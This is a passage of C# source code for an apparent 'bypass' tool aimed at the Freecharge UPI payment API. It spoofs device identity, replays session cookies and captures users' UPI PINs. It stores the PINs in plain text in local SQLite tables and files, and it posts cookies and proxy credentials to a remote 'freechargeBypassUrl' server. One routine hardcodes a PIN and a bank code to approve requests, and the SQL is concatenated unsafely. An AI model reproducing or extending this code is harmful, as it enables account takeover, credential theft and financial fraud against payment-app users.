        this.text6 = "{\"txnId\":\"" + txnId + "\",\"bankId\":\"" + bankcode + "\",\"device\":{\"app\":\"com.freecharge.upi\",\"os\":\"ios\",\"ip\":\"192.168.0.66\",\"osVersion\":\"26.3\",\"mobile\":\"" + customerid + "\",\"type\":\"MOB\",\"deviceName\":\"iPhone17,2\",\"id\":\"" + oemdeviceid + "\",\"capability\":\"" + mobilenumber.Text + "\",\"geocode\":\"" + latLong + "\"},\"aadhaarConsent\":\"N\",\"customerId\":\"" + customerid + "\"}";
        string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v1/ar/fetch-customer-accounts?fcAppType=android&fcChannel=3&fcversion=578";
        if (!_Request_Sbi1(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, this.num, this.num, ref string_96, ref string_95, ref webException_0)) ;
        if (string_96.Contains("accRefNumber"))
        {
            bankName = jsonData_Serial(string_96, "bankName");
            maskedAccnumber = jsonData_Serial(string_96, "maskedAccnumber");
            PinUpi pinUpi = new PinUpi();
            pinUpi.Form1_Load(bankName, maskedAccnumber);
            upipinn = pinUpi.bvalue;
            this.text6 = "{\"device\":{\"app\":\"com.freecharge.upi\",\"capability\":\"" + mobilenumber.Text + "\",\"id\":\"" + oemdeviceid + "\",\"ip\":\"192.168.0.66\",\"mobile\":\"" + customerid + "\",\"os\":\"android\",\"type\":\"MOB\"},\"deviceIdList\":[\"70a25356a53746b3be24334a684c1188\"],\"deviceIdMigrationFlowVersion\":3}";
            this.text6 = this.text6.Replace("70a25356a53746b3be24334a684c1188", oemdeviceid);
            string string_ = "";
            string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v1/upistatus?fcAppType=android&fcChannel=3&fcversion=578";
            if (_Request_Sbi1(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_, ref string_95, ref webException_0))
            {
            }
            if (string_96.Contains("Success"))
            {
                upiid = jsonData_Serial(string_, "vpa");
                bankcode = jsonData_Serial(string_96, "bankCode");
                bankName = jsonData_Serial(string_96, "bankName");
                accRefNumber = jsonData_Serial(string_96, "accRefNumber");
                typea = jsonData_Serial(string_96, "type");
                maskedAccnumber = jsonData_Serial(string_96, "maskedAccnumber");
                atmpinlengh = jsonData_Serial(string_96, "atmpinlength");
                dlength = jsonData_Serial(string_96, "dlength");
                ifsc = jsonData_Serial(string_96, "ifsc");
                otpLength = jsonData_Serial(string_96, "otpLength");
                names = jsonData_Serial(string_96, "name");
                try
                {
                    foreach (Cookie cookie in cookieContainer_3.GetCookies(new Uri(string_93)))
                    {
                        if (cookie.Name == "app_fc")
                        {
                            app_fc = cookie.Value;
                        }
                    }
                }
                catch
                {
                }
            }
            string plainText = string_96 + "|||" + app_fc + "|||" + oemdeviceid + "|||" + mobilenumber.Text + "|||" + miib + "|||" + ki + "|||" + csrfRequestIdentifier + "|||" + bankcode + "|||" + fc_v + "|||" + text4 + "|||" + upipinn + "|||" + uniquedevice;
            //plainText = EncryptDataWithAes(plainText);
            Table_Write_Save_RegisInfo(plainText);
            //AddintoDatabase(upiid, upipinn, mobilenumber.Text);
            AddintoDatabase_BHIM(upiid, upipinn, mobilenumber.Text);
            //AddintoDatabase_OTO(upiid, upipinn, mobilenumber.Text);
            //AddintoDatabase_PAY10(upiid, upipinn, mobilenumber.Text);
            try
            {
                string text6 = "./Freecharge";
                if (!Directory.Exists(text6))
                {
                    Directory.CreateDirectory(text6);
                }
                Path_ = text6 + "\\" + upiid + ".rg";
                File.WriteAllText(Path_, plainText);
                switch (MessageBox.Show("Bypass sucessfull.... kya ap account ka balance dekhna chahte hai???", "Sucess", MessageBoxButtons.YesNo))
                {
                    case DialogResult.No:
                        balanceshow = false;
                        break;
                    case DialogResult.Yes:
                        balanceshow = true;
                        break;
                }
            }
            catch
            {
            }
        }
        else
        {
            jsonData_Serial(string_96, "result");
            label2.Visible = true;
            label2.Text = "No Account is linked Please download freecharge app and add your primary account.";
        }
        if (balanceshow)
        {
            string text7 = "AXIFRC" + RandomString(29, "0123456789abcdef");
            string input = "|" + text7 + "|||" + packageName + "|91" + mobilenumber.Text + "|" + oemdeviceid;
            string text8 = sha256_hashing(input, text4);
            string text9 = upipinn;
            string input2 = text9 + "|" + text7 + "|" + text8;
            string base64PublicKey = miib;
            string newValue = RSA_ENCRYPT_PKEY(input2, base64PublicKey);
            this.text6 = "{\"ac\":{\"accRefNumber\":\"" + accRefNumber + "\",\"address\":null,\"aeba\":\"Y\",\"atmpinFormat\":\"FORMAT3|FORMAT1\",\"atmpinlength\":\"" + atmpinlengh + "\",\"balTime\":\"\",\"balance\":\"\",\"bankId\":null,\"bankName\":\"" + bankName + "\",\"dLength\":\"" + dLength + "\",\"dType\":\"NUM\",\"dlength\":\"" + dlength + "\",\"dtype\":\"NUM\",\"ifsc\":\"" + ifsc + "\",\"iin\":\"" + bankcode + "\",\"logo\":\"" + logo + "\",\"maskedAccnumber\":\"" + maskedAccnumber + "\",\"mbeba\":\"Y\",\"mmid\":null,\"name\":\"" + names + "\",\"otpFormat\":\"NUM\",\"otpLength\":\"" + otpLength + "\",\"partyId\":null,\"status\":\"A\",\"type\":\"" + typea + "\",\"uidnum\":null,\"vpa\":\"" + upiid + "\"},\"bankId\":\"" + bankcode + "\",\"cred\":{\"data\":{\"code\":\"NPCI\",\"encryptedBase64String\":\"2.1|N7MwAQgDTF6yBVPhQRPtQWJrzM6MHYFM9TPS5waTe3Nl5Nz2chVg+tnhZ79HENK5dNCz2aE5uG4NefmQNE8+h+GxQ4b4ojKawK1XsZ0Hy7fl1EM8uGP1mEp09+vsxCvfUQ3OyEnd7ACcKYkQcivqu7KtgU6X4VLNhOLBH2K5JiOCnOJ+Exwo5WlyM1cscJrAJCh2+oBx90thOUadhptT9zMTjBtB3EEiHvTM5ZGlySkDBnGjFV1OIwBWHYOCHVGJ3YxsT8Gb5OviuiSvQ7dnF24XBqV+zudpMKtttXl+FqiQv4NWcmQC21fQR6lic8GShpCqBPEck0QlEgLg==\",\"ki\":\"" + ki + "\"},\"subType\":\"MPIN\",\"type\":\"PIN\"},\"customerId\":\"" + customerid + "\",\"device\":{\"app\":\"com.freecharge.upi\",\"capability\":\"" + mobilenumber.Text + "\",\"id\":\"" + oemdeviceid + "\",\"ip\":\"192.168.0.66\",\"mobile\":\"" + mobilenumber.Text + "\",\"os\":\"android\",\"type\":\"MOB\"},\"txnid\":\"" + text7 + "\"}";
            this.text6 = this.text6.Replace("N7MwAQgDTF6yBVPhQRPtQWJrzM6MHYFM9TPS5waTe3Nl5Nz2chVg+tnhZ79HENK5dNCz2aE5uG4NefmQNE8+h+GxQ4b4ojKawK1XsZ0Hy7fl1EM8uGP1mEp09+vsxCvfUQ3OyEnd7ACcKYkQcivqu7KtgU6X4VLNhOLBH2K5JiOCnOJ+Exwo5WlyM1cscJrAJCh2+oBx90thOUadhptT9zMTjBtB3EEiHvTM5ZGlySkDBnGjFV1OIwBWHYOCHVGJ3YxsT8Gb5OviuiSvQ7dnF24XBqV+zudpMKtttXl+FqiQv4NWcmQC21fQR6lic8GShpCqBPEck0QlEgLg==", newValue);
            string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v2/ar/balance-enquiry?fcAppType=android&fcChannel=3&fcversion=578";
            if (_Request_Sbi1(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
            {
            }
            string text10 = jsonData_Serial(string_96, "availableBalance");
            UpiBalnce upiBalnce = new UpiBalnce();
            string strin_ = "Account Balance for " + maskedAccnumber + "==> " + text10;
            upiBalnce.Form1_Load(strin_, bankName);
            Close();
        }
    }

    private string GetBanks()
    {
        BankList bankList = new BankList();
        bankList.ShowDialog();
        bankcode = bankList.bvalue;
        FreechargeBankDTO freechargeBankDTO = new FreechargeBankDTO();
        freechargeBankDTO.ProxyStr = ProxyToString(webProxy_3);
        freechargeBankDTO.BankCode = bankcode;
        freechargeBankDTO.Customerid = customerid;
        freechargeBankDTO.MobileNumber = mobilenumber.Text;
        freechargeBankDTO.oemdeviceid = oemdeviceid;
        freechargeBankDTO.csrfRequestIdentifier = csrfRequestIdentifier;
        freechargeBankDTO.ClientId = Program.clientID;
        freechargeBankDTO.Mac = Program.mac;
        freechargeBankDTO.cookies = new List<CookieData>();
        foreach (Cookie cookie in cookieContainer_3.GetCookies(new Uri("https://mobile-rest.freechargebiz.in/rest/upi/v1/token?fcAppType=android&fcChannel=3&fcversion=578")))
        {
            CookieData cookieData = new CookieData();
            cookieData.Name = cookie.Name;
            cookieData.Value = cookie.Value;
            cookieData.Domain = cookie.Domain;
            cookieData.Secure = cookie.Secure;
            freechargeBankDTO.cookies.Add(cookieData);
        }
        return staticstore.invokePostRequestJson(staticstore.freechargeBypassUrl + "GetBanks", JsonConvert.SerializeObject(freechargeBankDTO));
    }

    private static string ProxyToString(WebProxy webProxy_12)
    {
        if (webProxy_12 == null || webProxy_12.Address == null)
        {
            return string.Empty;
        }
        string text = webProxy_12.Address.ToString().TrimEnd('/');
        if (!(webProxy_12.Credentials is NetworkCredential networkCredential))
        {
            return text;
        }
        return "http://" + networkCredential.UserName + ":" + networkCredential.Password + "@" + text.Replace("http://", "").Replace("https://", "");
    }

    internal static string GetRandAesKey()
    {
        try
        {
            byte[] array = new byte[LenghtAesKeyBytes];
            rngCsp.GetBytes(array);
            return bytesToHexString(array);
        }
        catch
        {
            return "";
        }
    }

    public static string sha256_hashing(string input, string key)
    {
        return Convert.ToBase64String(EncryptAESA(Sha256Hash(input), HexStringToByteArray(key)));
    }

    private static byte[] EncryptAESA(byte[] input, byte[] key)
    {
        IBufferedCipher cipher = CipherUtilities.GetCipher("AES/CBC/PKCS5Padding");
        ParameterUtilities.CreateKeyParameter("AES", key);
        cipher.Init(forEncryption: true, new ParametersWithIV(new KeyParameter(key), new byte[16]));
        return cipher.DoFinal(input);
    }

    private static byte[] Sha256Hash(string input)
    {
        Sha256Digest sha256Digest = new Sha256Digest();
        byte[] bytes = Encoding.UTF8.GetBytes(input);
        sha256Digest.BlockUpdate(bytes, 0, bytes.Length);
        byte[] array = new byte[sha256Digest.GetDigestSize()];
        sha256Digest.DoFinal(array, 0);
        return array;
    }

    private static byte[] HexStringToByteArray(string hexString)
    {
        int length = hexString.Length;
        byte[] array = new byte[length / 2];
        for (int i = 0; i < length; i += 2)
        {
            array[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
        }
        return array;
    }

    public static string RSA_ENCRYPT_PKEY(string input, string base64PublicKey)
    {
        AsymmetricKeyParameter publicKey = PublicKeyFactory.CreateKey(Convert.FromBase64String(base64PublicKey));
        return RsaEncrypt(input, publicKey);
    }
    public void Table_Write_Save_RegisInfo(string val)
    {
        string[] array = new string[5];
        string text = "INSERT INTO TBL_FREECHARGE(MobNo, RegiInfo, TimeStamp) VALUES ('";
        array[0] = text;
        array[1] = mobilenumber.Text;
        string text2 = "', '";
        string text3 = "', '";
        array[2] = text2 + val + text3;
        DateTime now = DateTime.Now;
        string text4 = "dd/M/yyyy hh:mm:ss.fff tt";
        array[3] = now.ToString(text4);
        string text5 = "')";
        array[4] = text5;
        string query = string.Concat(array);
        ExecuteQuery(query);
    }

    public void AddintoDatabase(string vpa, string pin, string mob)
    {
        try
        {
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            string text = "IPAYUPI";
            string text2 = "IPAYUPI_" + vpa;
            string text3 = vpa + "||" + pin + "||" + mob;
            sQLiteCommand.CommandText = "SELECT count(RID) from TBL_BANK where BANK_SAVEAS = '" + text2 + "' AND BANK_ISDEBIT = 0";
            object obj = sQLiteCommand.ExecuteScalar();
            int result = 0;
            if (obj != null && obj.GetType() != typeof(DBNull))
            {
                int.TryParse(obj.ToString().Trim(), out result);
            }
            if (result <= 0)
            {
                string query = "INSERT INTO TBL_BANK(BANK_NAME, BANK_SAVEAS, BANK_DETAILS, BANK_ISDEBIT) VALUES ('" + text + "', '" + text2 + "', '" + text3 + "', 0)";
                ExecuteQuery(query);
            }
        }
        catch
        {
        }
    }

    public void AddintoDatabase_BHIM(string vpa, string pin, string mob)
    {
        try
        {
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            string text = "BHIMUPI";
            string text2 = "BHIMUPI_" + vpa;
            string text3 = vpa + "||" + pin + "||" + mob;
            sQLiteCommand.CommandText = "SELECT count(RID) from TBL_BANK where BANK_SAVEAS = '" + text2 + "' AND BANK_ISDEBIT = 0";
            object obj = sQLiteCommand.ExecuteScalar();
            int result = 0;
            if (obj != null && obj.GetType() != typeof(DBNull))
            {
                int.TryParse(obj.ToString().Trim(), out result);
            }
            if (result <= 0)
            {
                string query = "INSERT INTO TBL_BANK(BANK_NAME, BANK_SAVEAS, BANK_DETAILS, BANK_ISDEBIT) VALUES ('" + text + "', '" + text2 + "', '" + text3 + "', 0)";
                ExecuteQuery(query);
            }
        }
        catch
        {
        }
    }

    public void AddintoDatabase_OTO(string vpa, string pin, string mob)
    {
        try
        {
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            string text = "OTOPAY";
            string text2 = "OTOPAY_" + vpa;
            string text3 = vpa + "||" + pin + "||" + mob;
            sQLiteCommand.CommandText = "SELECT count(RID) from TBL_BANK where BANK_SAVEAS = '" + text2 + "' AND BANK_ISDEBIT = 0";
            object obj = sQLiteCommand.ExecuteScalar();
            int result = 0;
            if (obj != null && obj.GetType() != typeof(DBNull))
            {
                int.TryParse(obj.ToString().Trim(), out result);
            }
            if (result <= 0)
            {
                string query = "INSERT INTO TBL_BANK(BANK_NAME, BANK_SAVEAS, BANK_DETAILS, BANK_ISDEBIT) VALUES ('" + text + "', '" + text2 + "', '" + text3 + "', 0)";
                ExecuteQuery(query);
            }
        }
        catch
        {
        }
    }

    public void AddintoDatabase_PAY10(string vpa, string pin, string mob)
    {
        try
        {
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            string text = "PAY10";
            string text2 = "PAY10_" + vpa;
            string text3 = vpa + "||" + pin + "||" + mob;
            sQLiteCommand.CommandText = "SELECT count(RID) from TBL_BANK where BANK_SAVEAS = '" + text2 + "' AND BANK_ISDEBIT = 0";
            object obj = sQLiteCommand.ExecuteScalar();
            int result = 0;
            if (obj != null && obj.GetType() != typeof(DBNull))
            {
                int.TryParse(obj.ToString().Trim(), out result);
            }
            if (result <= 0)
            {
                string query = "INSERT INTO TBL_BANK(BANK_NAME, BANK_SAVEAS, BANK_DETAILS, BANK_ISDEBIT) VALUES ('" + text + "', '" + text2 + "', '" + text3 + "', 0)";
                ExecuteQuery(query);
            }
        }
        catch
        {
        }
    }

    public bool AddintoDatabase_UPI(string vpa, string pin, string mob, string upiId)
    {
        try
        {
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            string text = upiId.ToUpper();
            string text2 = upiId.ToUpper() + "_" + vpa;
            string text3 = vpa + "||" + pin + "||" + mob;
            sQLiteCommand.CommandText = "SELECT count(RID) from TBL_BANK where BANK_SAVEAS = '" + text2 + "' AND BANK_ISDEBIT = 0";
            object obj = sQLiteCommand.ExecuteScalar();
            int result = 0;
            if (obj != null && obj.GetType() != typeof(DBNull) && int.Parse(obj.ToString().Trim()) > 0)
            {
                int.TryParse(obj.ToString().Trim(), out result);
                return false;
            }
            if (result <= 0)
            {
                string query = "INSERT INTO TBL_BANK(BANK_NAME, BANK_SAVEAS, BANK_DETAILS, BANK_ISDEBIT) VALUES ('" + text + "', '" + text2 + "', '" + text3 + "', 0)";
                ExecuteQuery(query);
                return true;
            }
        }
        catch
        {
        }
        return false;
    }

    private void ExecuteQuery(string Query)
    {
        try
        {
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            sQLiteCommand.CommandText = Query;
            sQLiteCommand.ExecuteNonQuery();
            sQLiteConnection.Close();
            sQLiteCommand.Dispose();
        }
        catch
        {
        }
    }

    private static AsymmetricKeyParameter ReadPublicKeyFromCrt()
    {
        try
        {
            return new X509CertificateParser().ReadCertificate(Encoding.UTF8.GetBytes(x509CertSecondService)).GetPublicKey();
        }
        catch (Exception)
        {
            return null;
        }
    }

    public static string RsaEncrypt(string input, AsymmetricKeyParameter publicKey)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(input);
        byte[] inArray;
        try
        {
            OaepEncoding oaepEncoding = new OaepEncoding(new RsaEngine(), new Sha256Digest(), new Sha256Digest(), null);
            oaepEncoding.Init(forEncryption: true, publicKey);
            inArray = oaepEncoding.ProcessBlock(bytes, 0, bytes.Length);
        }
        catch (Exception ex)
        {
            return "Exception while encrypting data: " + ex.Message;
        }
        return Convert.ToBase64String(inArray);
    }

    public static string rsaEncryptSecondHardCodedRSAkey(string plainText)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(plainText);
        RSACryptoServiceProvider rSACryptoServiceProvider = parseX509Cert(x509CertSecondService);
        byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: false);
        return Convert.ToBase64String(inArray);
    }

    public static RSACryptoServiceProvider parseX509Cert(string x509Cert)
    {
        x509Cert = x509Cert.Replace("\r\n", "\n");
        byte[] bytes = Encoding.UTF8.GetBytes(x509Cert);
        X509Certificate2 x509Certificate = new X509Certificate2();
        x509Certificate.Import(bytes);
        Console.WriteLine("{0}Subject: {1}{0}", Environment.NewLine, x509Certificate.Subject);
        Console.WriteLine("{0}Issuer: {1}{0}", Environment.NewLine, x509Certificate.Issuer);
        Console.WriteLine("{0}Version: {1}{0}", Environment.NewLine, x509Certificate.Version);
        Console.WriteLine("{0}Valid Date: {1}{0}", Environment.NewLine, x509Certificate.NotBefore);
        Console.WriteLine("{0}Expiry Date: {1}{0}", Environment.NewLine, x509Certificate.NotAfter);
        Console.WriteLine("{0}Thumbprint: {1}{0}", Environment.NewLine, x509Certificate.Thumbprint);
        Console.WriteLine("{0}Serial Number: {1}{0}", Environment.NewLine, x509Certificate.SerialNumber);
        Console.WriteLine("{0}Friendly Name: {1}{0}", Environment.NewLine, x509Certificate.PublicKey.Oid.FriendlyName);
        Console.WriteLine("{0}Public Key Format: {1}{0}", Environment.NewLine, x509Certificate.PublicKey.EncodedKeyValue.Format(multiLine: true));
        Console.WriteLine("{0}Raw Data Length: {1}{0}", Environment.NewLine, x509Certificate.RawData.Length);
        Console.WriteLine("{0}Certificate to string: {1}{0}", Environment.NewLine, x509Certificate.ToString(verbose: true));
        return (RSACryptoServiceProvider)x509Certificate.PublicKey.Key;
    }

    public static string UpperCaseUrlEncode(string s, Encoding encoding)
    {
        char[] array = HttpUtility.UrlEncode(s, encoding).ToCharArray();
        for (int i = 0; i < array.Length - 2; i++)
        {
            if (array[i] == '%')
            {
                array[i + 1] = char.ToUpper(array[i + 1]);
                array[i + 2] = char.ToUpper(array[i + 2]);
            }
        }
        return new string(array);
    }

    public static string bytesToHexString(byte[] bArr)
    {
        char[] array = new char[bArr.Length * 2];
        for (int i = 0; i < bArr.Length; i++)
        {
            int num = bArr[i] & 0xFF;
            array[i * 2] = hexArray[num >> 4];
            array[i * 2 + 1] = hexArray[num & 0xF];
        }
        return new string(array);
    }

    private string namegen()
    {
        Random random = new Random();
        random.Next(4, 10);
        return method_1();
    }

    private string method_1()
    {
        string[] array = listName.Split(new string[1] { "," }, StringSplitOptions.None);
        Random random = new Random();
        int num = random.Next(0, array.Length);
        return array[num];
    }

    private static string method_14()
    {
        DateTime utcNow = DateTime.UtcNow;
        DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
        return ((long)(utcNow - dateTime).TotalMilliseconds).ToString();
    }

    private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void button2_Click(object sender, EventArgs e)
    {
        string text = listBox1.SelectedItem.ToString();
        string text2 = ".\\Freecharge\\" + text + ".rg";
        string currentDirectory = Directory.GetCurrentDirectory();
        Path_ = currentDirectory + text2;
        if (File.Exists(Path_))
        {
            string text3 = "";
            text3 = File.ReadAllText(Path_);
            //text3 = DecryptDataWithAes(text3.Trim(), "b14ca4040a4e4133bbce2ea2315a1000");
            string text4 = checkbakance(text3);
            string text5 = jsonData_Serial(string_96, "code");
            if (text5 == "00")
            {
                text4 = jsonData_Serial(string_96, "availableBalance");
                UpiBalnce upiBalnce = new UpiBalnce();
                string strin_ = "Account Balance for " + maskedAccnumber + "==> " + text4;
                upiBalnce.Form1_Load(strin_, bankName);
            }
            else
            {
                string text6 = jsonData_Serial(string_96, "result");
                MessageBox.Show(text6);
            }
        }
    }

    private string checkbakance(string readdata)
    {
        string[] array = readdata.Split(new string[1] { "|||" }, StringSplitOptions.None);
        Guid.NewGuid().ToString().Replace("-", "");
        fc_v = array[8];
        app_fc = array[1];
        string_96 = array[0];
        upipinn = array[10];
        string text = GetRandAesKey().ToLower();
        text = array[9];
        customerid = "91" + array[3];
        miib = array[4];
        ki = array[5];
        oemdeviceid = array[2];
        csrfRequestIdentifier = array[6];
        mobnumber = array[3];
        bankcode = array[7];
        cookieContainer_3 = new CookieContainer();
        try
        {
            Cookie cookie = new Cookie("app_fc", app_fc)
            {
                Domain = "mobile-rest.freechargebiz.in",
                Secure = Convert.ToBoolean("true")
            };
            cookieContainer_3.Add(cookie);
            Cookie cookie2 = new Cookie("fc.tv", fc_v)
            {
                Domain = "mobile-rest.freechargebiz.in",
                Secure = Convert.ToBoolean("true")
            };
            cookieContainer_3.Add(cookie2);
            Cookie cookie3 = new Cookie("fc_upi_ab", "2")
            {
                Domain = "mobile-rest.freechargebiz.in",
                Secure = Convert.ToBoolean("true")
            };
            cookieContainer_3.Add(cookie3);
            Cookie cookie4 = new Cookie("scr_upi", "nupi")
            {
                Domain = "mobile-rest.freechargebiz.in",
                Secure = Convert.ToBoolean("true")
            };
            cookieContainer_3.Add(cookie4);
            Cookie cookie5 = new Cookie("upi_f_re", "1")
            {
                Domain = ".freechargebiz.in",
                Secure = Convert.ToBoolean("true")
            };
            cookieContainer_3.Add(cookie5);
        }
        catch
        {
        }
        num = 15000;
        if (string_96.Contains("accRefNumber"))
        {
            bankName = jsonData_Serial(string_96, "bankName");
            maskedAccnumber = jsonData_Serial(string_96, "maskedAccnumber");
            text6 = "{\"device\":{\"app\":\"com.freecharge.upi\",\"capability\":\"" + mobnumber + "\",\"id\":\"" + oemdeviceid + "\",\"ip\":\"192.168.0.66\",\"mobile\":\"" + customerid + "\",\"os\":\"android\",\"type\":\"MOB\"},\"deviceIdList\":[\"" + oemdeviceid + "\"],\"deviceIdMigrationFlowVersion\":3}";
            text6 = text6.Replace("70a25356a53746b3be24334a684c1188", oemdeviceid);
            string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v1/upistatus?fcAppType=android&fcChannel=3&fcversion=578";
            string string_ = "";
            if (_Request_Sbi1(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_, ref string_95, ref webException_0))
            {
            }
            if (string_96.Contains("SUCCESS"))
            {
                upiid = jsonData_Serial(string_, "vpa");
                bankcode = jsonData_Serial(string_96, "bankCode");
                bankName = jsonData_Serial(string_96, "bankName");
                accRefNumber = jsonData_Serial(string_96, "accRefNumber");
                typea = jsonData_Serial(string_96, "type");
                maskedAccnumber = jsonData_Serial(string_96, "maskedAccnumber");
                atmpinlengh = jsonData_Serial(string_96, "atmpinlength");
                dlength = jsonData_Serial(string_96, "dlength");
                dLength = jsonData_Serial(string_96, "dLength");
                ifsc = jsonData_Serial(string_96, "ifsc");
                otpLength = jsonData_Serial(string_96, "otpLength");
                names = jsonData_Serial(string_96, "name");
                _ = string_96 + "|||" + app_fc + "|||" + oemdeviceid + "|||" + mobnumber + "|||" + miib + "|||" + ki + "|||" + csrfRequestIdentifier + "||||||" + fc_v;
            }
            else if (string_96.Contains("DEVICE_CHANGED"))
            {
                MessageBox.Show("Device Changed Detected Please delete and bypass again");
                Close();
            }
            else if (string_96.Contains("ER-"))
            {
                string text2 = jsonData_Serial(string_96, "result");
                label2.Visible = true;
                label2.Text = text2;
            }
        }
        else
        {
            jsonData_Serial(string_96, "result");
            label2.Visible = true;
            label2.Text = "No Account is linked Please download freecharge app and add your primary account.";
        }
        string text3 = "AXIFRC" + RandomString(29, "0123456789abcdef");
        string input = "|" + text3 + "|||" + packageName + "|91" + mobnumber + "|" + oemdeviceid;
        string text4 = sha256_hashing(input, text);
        string text5 = upipinn;
        string input2 = text5 + "|" + text3 + "|" + text4;
        string base64PublicKey = miib;
        string newValue = RSA_ENCRYPT_PKEY(input2, base64PublicKey);
        text6 = "{\"ac\":{\"accRefNumber\":\"" + accRefNumber + "\",\"address\":null,\"aeba\":\"Y\",\"atmpinFormat\":\"FORMAT3|FORMAT1\",\"atmpinlength\":\"" + atmpinlengh + "\",\"balTime\":\"\",\"balance\":\"\",\"bankId\":null,\"bankName\":\"" + bankName + "\",\"dLength\":\"" + dLength + "\",\"dType\":\"NUM\",\"dlength\":\"" + dlength + "\",\"dtype\":\"NUM\",\"ifsc\":\"" + ifsc + "\",\"iin\":\"" + bankcode + "\",\"logo\":\"" + logo + "\",\"maskedAccnumber\":\"" + maskedAccnumber + "\",\"mbeba\":\"Y\",\"mmid\":null,\"name\":\"" + names + "\",\"otpFormat\":\"NUM\",\"otpLength\":\"" + otpLength + "\",\"partyId\":null,\"status\":\"A\",\"type\":\"" + typea + "\",\"uidnum\":null,\"vpa\":\"" + upiid + "\"},\"bankId\":\"" + bankcode + "\",\"cred\":{\"data\":{\"code\":\"NPCI\",\"encryptedBase64String\":\"2.1|N7MwAQgDTF6yBVPhQRPtQWJrzM6MHYFM9TPS5waTe3Nl5Nz2chVg+tnhZ79HENK5dNCz2aE5uG4NefmQNE8+h+GxQ4b4ojKawK1XsZ0Hy7fl1EM8uGP1mEp09+vsxCvfUQ3OyEnd7ACcKYkQcivqu7KtgU6X4VLNhOLBH2K5JiOCnOJ+Exwo5WlyM1cscJrAJCh2+oBx90thOUadhptT9zMTjBtB3EEiHvTM5ZGlySkDBnGjFV1OIwBWHYOCHVGJ3YxsT8Gb5OviuiSvQ7dnF24XBqV+zudpMKtttXl+FqiQv4NWcmQC21fQR6lic8GShpCqBPEck0QlEgLg==\",\"ki\":\"" + ki + "\"},\"subType\":\"MPIN\",\"type\":\"PIN\"},\"customerId\":\"" + customerid + "\",\"device\":{\"app\":\"com.freecharge.upi\",\"capability\":\"" + mobnumber + "\",\"id\":\"" + oemdeviceid + "\",\"ip\":\"192.168.0.66\",\"mobile\":\"" + mobnumber + "\",\"os\":\"android\",\"type\":\"MOB\"},\"txnid\":\"" + text3 + "\"}";
        text6 = text6.Replace("N7MwAQgDTF6yBVPhQRPtQWJrzM6MHYFM9TPS5waTe3Nl5Nz2chVg+tnhZ79HENK5dNCz2aE5uG4NefmQNE8+h+GxQ4b4ojKawK1XsZ0Hy7fl1EM8uGP1mEp09+vsxCvfUQ3OyEnd7ACcKYkQcivqu7KtgU6X4VLNhOLBH2K5JiOCnOJ+Exwo5WlyM1cscJrAJCh2+oBx90thOUadhptT9zMTjBtB3EEiHvTM5ZGlySkDBnGjFV1OIwBWHYOCHVGJ3YxsT8Gb5OviuiSvQ7dnF24XBqV+zudpMKtttXl+FqiQv4NWcmQC21fQR6lic8GShpCqBPEck0QlEgLg==", newValue);
        string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v2/ar/balance-enquiry?fcAppType=android&fcChannel=3&fcversion=578";
        if (_Request_Sbi1(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
        {
        }
        return string_96;
    }

    private string approveRequest(string readdata)
    {
        string text = listBox1.SelectedItem.ToString();
        string text2 = ".\\Freecharge\\" + text + ".rg";
        string currentDirectory = Directory.GetCurrentDirectory();
        Path_ = currentDirectory + text2;
        string[] array = readdata.Split(new string[1] { "|||" }, StringSplitOptions.None);
        Guid.NewGuid().ToString().Replace("-", "");
        fc_v = array[8];
        app_fc = array[1];
        string_96 = array[0];
        upipinn = "786420";
        string key = GetRandAesKey().ToLower();
        customerid = "91" + array[3];
        miib = array[4];
        ki = array[5];
        oemdeviceid = array[2];
        csrfRequestIdentifier = array[6];
        mobnumber = customerid.Replace("91", "");
        bankcode = array[7];
        bankcode = "607420";
        cookieContainer_3 = new CookieContainer();
        try
        {
            Cookie cookie = new Cookie("app_fc", app_fc)
            {
                Domain = ".freechargebiz.in",
                Secure = Convert.ToBoolean("true")
            };
            cookieContainer_3.Add(cookie);
            Cookie cookie2 = new Cookie("fc.tv", fc_v)
            {
                Domain = ".freechargebiz.in",
                Secure = Convert.ToBoolean("true")
            };
            cookieContainer_3.Add(cookie2);
            Cookie cookie3 = new Cookie("fc_upi_ab", "2")
            {
                Domain = ".freechargebiz.in",
                Secure = Convert.ToBoolean("true")
            };
            cookieContainer_3.Add(cookie3);
            Cookie cookie4 = new Cookie("scr_upi", "nupi")
            {
                Domain = ".freechargebiz.in",
                Secure = Convert.ToBoolean("true")
            };
            cookieContainer_3.Add(cookie4);
